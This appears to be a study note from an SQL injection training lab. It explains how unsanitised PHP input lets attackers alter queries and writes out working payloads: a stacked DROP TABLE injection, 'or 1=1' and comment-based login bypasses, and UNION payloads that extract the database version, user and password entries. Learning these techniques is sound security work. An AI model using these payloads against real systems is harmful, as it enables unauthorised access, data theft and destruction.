# 🚑 Basic injections:

An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input.

Let's imagine the following code:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

The query to the database would be:

```sql
select * from logins where username like '%$searchInput'
```

So with a single quote, we could break everything:

```php
'%1'; DROP TABLE users;'
#which would turn out like this:
select * from logins where username like '%1'; DROP TABLE users;'
```

Here are the differente sql injections:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's go more in depth with the famous login bypass:

```sql
admin' or '1'='1
```

The final query should look like this:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

What happens on rhe backend is:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

We can also try the inverted command and use OR statement on the password with the `'1'='1` or `' or '1' = '1`:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You can also use comments to bypass auth, the query looks something like this when you use comments:

```shell-session
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

So we can inject `admin'--` as our username. The final query will be:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

We can also target users:

```sql
SELECT * FROM logins where (username='admin')
```

_**Login as the user with the id 5 to get the flag.**_

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
') OR id =5 -- -
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Union

The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases.

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.

If we wanted to use union statement on different numbers of columns:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.

To define how many columns a table has, we can use ORDER BY. We start with `order by 1`, then we will do `order by 2` and then `order by 3` until we reach a number that returns an error. If we failed at `order by 4`, this means the table has three columns

```sql
' order by 5-- -
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption><p>So there are 4 columns</p></figcaption></figure>

We could also use the union command:

```sql
cn' UNION select 1,2,3,4-- -
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

and now that we got the number of columns we can start injecting:

```sql
cn' UNION select 1,@@version,3,4-- -
```

`We cannot place our injection at the beginning, or its output will not be printed.`

This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:

```sql
cn' UNION select 1,@@version,3,4-- -
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

_**Use a Union injection to get the result of 'user()'**_

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

```
'UNION SELECT 1,user(),3,4-- -
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
